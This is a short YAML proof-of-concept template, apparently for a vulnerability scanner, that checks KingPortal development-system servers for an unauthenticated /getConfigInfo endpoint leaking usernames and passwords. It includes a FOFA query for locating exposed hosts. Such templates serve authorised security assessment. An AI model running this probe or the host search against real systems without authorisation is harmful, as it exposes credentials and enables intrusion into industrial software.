id: poc-yaml-kingportal-getconfigInfo-info-leak
info:
  name: 北京亚控科技KingPortal开发系统 getConfigInfo 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: KingPortal开发系统
  fofa: body="KingPortal运行系统"
requests:
- method: GET
  path: /getConfigInfo
  expression: "status_code == 200 && \ncontains(body,\"\\\"defaultUser\\\"\") &&\n\
    contains(body,\"\\\"username\\\"\") &&\ncontains(body,\"\\\"password\\\"\") &&\n\
    contains(body,\"\\\"APPName\\\"\") &&\n!contains(body,\"<\")\n"
variables: {}
transport: http
